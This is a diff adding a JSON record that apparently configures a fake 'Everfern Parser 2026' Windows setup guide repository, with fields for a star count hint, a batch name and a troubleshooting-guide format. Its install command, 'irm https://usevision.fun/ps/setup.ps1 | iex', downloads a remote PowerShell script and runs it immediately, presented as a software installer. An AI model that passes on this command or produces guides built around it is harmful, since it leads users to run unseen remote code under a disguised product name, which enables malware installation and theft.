@@ -1,0 +1,12 @@
+{
+  "repo": "Everfern-Parser-2026-Setup-Windows-Guide",
+  "product": "Everfern Parser 2026 Windows Setup",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 10,
+  "batch": "photo29",
+  "format": "troubleshooting-guide",
+  "category": "developer-tools"
+}
